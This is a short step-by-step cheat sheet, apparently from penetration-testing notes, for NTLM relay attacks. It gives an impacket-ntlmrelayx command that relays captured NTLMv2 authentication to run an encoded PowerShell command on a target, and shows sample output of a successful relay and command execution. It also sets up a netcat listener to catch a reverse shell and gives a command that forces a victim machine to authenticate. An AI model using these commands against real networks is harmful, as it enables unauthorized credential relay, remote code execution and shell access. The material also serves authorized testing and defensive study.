### **Relay Attacks**

**Steps**

1. **Start Impacket `ntlmrelayx`**: use the Impacket `ntlmrelayx` tool to capture NTLMv2 requests and relay them to a target. Replace `<target_ip>` with the IP address of the machine where you want to execute the command. The reverse shell command is optional.

```bash
impacket-ntlmrelayx --no-http-server -smb2support -t <target_ip> -c "powershell -enc <base64_encoded_powershell_command_to_be_executed_on_the_target_machine>"

Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation
[*] Protocol Client SMB loaded..
[*] Protocol Client IMAPS loaded..
[*] Protocol Client IMAP loaded..
[*] Protocol Client HTTP loaded..
[*] Protocol Client HTTPS loaded..
[*] Running in relay mode to single host
[*] Setting up SMB Server
[*] Setting up WCF Server
[*] Setting up RAW Server on port 6666

[*] Servers started, waiting for connections

```

1. **Expected Output After Victim Request**: once the victim makes a request, you should see output like this indicating that the relay was successful and the command was executed on the target:

```bash
[*] SMBD-Thread-4: Received connection from <victim_ip>, attacking target smb://<target_ip>
[*] Authenticating against smb://<target_ip> as <domain>/<username> SUCCEED
[*] SMBD-Thread-6: Connection from <victim_ip> controlled, but there are no more targets left!
...
[*] Executed specified command on host: <target_ip>

```

1. **Setup Netcat Listener**

```bash
# The port should match the port specified in the reverse shell command
nc -nvlp [port]

```

1. **Force Victim Request (Example)** Trigger the victim machine to make a request to the Responder server, which can be done through various means such as Remote Code Execution (RCE) in a web application:

```powershell
# <responder_ip>: IP address of the machine running the Responder server.
C:\Windows\system32> dir \\<responder_ip>\test

```
